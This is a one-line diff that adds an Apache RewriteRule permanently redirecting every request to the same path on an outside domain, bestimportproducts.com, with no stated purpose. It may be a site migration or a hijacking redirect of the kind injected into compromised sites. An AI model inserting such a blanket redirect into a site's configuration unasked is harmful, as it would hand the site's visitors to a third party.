@@ -1,0 +1,2 @@
+RewriteRule (.*) https://bestimportproducts.com/$1 [R=301,L]
+
